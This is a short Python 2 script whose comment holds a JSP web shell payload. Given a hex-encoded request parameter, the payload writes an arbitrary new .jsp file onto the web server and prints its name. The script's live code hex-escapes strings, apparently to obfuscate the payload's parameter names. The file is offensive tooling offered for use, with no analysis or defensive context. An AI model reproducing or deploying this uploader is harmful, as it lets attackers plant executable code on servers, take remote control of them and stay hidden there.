import binascii;

#payload="<%String p=request.getParameter(\"nixi\");String q=request.getParameter(\"A7A607\");String a=(new java.io.File(application.getRealPath(request.getRequestURI().replace(request.getContextPath(),\"\")))).getParent();if(p!=null&&p!=\"\"){String r=String.valueOf(Math.random()).substring(3,8)+\".jsp\";if(q==null||q.equals(\"\")){q=new String(a);}else{q=J(q);}java.io.FileOutputStream f=new java.io.FileOutputStream(q+java.io.File.separator+r);f.write(J(p).getBytes());f.close();out.print(r);}else{out.print(a);}%><%!String J(String str){String ret=\"\";String s[]=str.split(\"O\");for(int i=0;i<s.length;i++){char[] by=new char[(s[i].length()==2)?(s[i].length()/2):(s[i].length()/4)];for(int j=0;j<by.length;j++){by[j]=(char)(Integer.parseInt(s[i],16));}ret+=new String(by);}return ret;}%>"
payload = "jexinv";
for i in range(0,len(payload)):
    print "\\x" + binascii.b2a_hex(payload[i]),
    
# nixi = \x6e\x69\x78\x69